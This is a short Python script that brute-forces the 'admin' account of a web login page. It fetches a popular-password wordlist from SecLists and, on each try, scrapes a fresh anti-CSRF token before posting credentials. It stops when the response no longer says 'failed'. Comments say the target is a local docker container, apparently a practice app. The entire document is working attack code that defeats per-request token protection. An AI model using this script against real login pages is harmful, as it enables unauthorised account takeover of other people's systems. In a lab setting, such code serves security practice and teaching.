import requests
from bs4 import BeautifulSoup

# use an existing password list
password_dict = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Most-Popular-Letter-Passes.txt")
password_list = password_dict.text.splitlines()

# website to log into
# in this case our docker container running a web app
url = 'http://localhost/login.php'
s = requests.Session()

for password in password_list:
    resp = s.get(url)    
    soup = BeautifulSoup(resp.content, 'html.parser')
    token = soup.find('input', {'name': 'user_token'}).get('value')
    print("trying password: "+password)
    data = {'username':'admin','password':password,'Login':'Login','user_token':token}

    resp = s.post( url, data=data )
    if "failed" not in resp.text:
        print("The password is = "+password)
        break
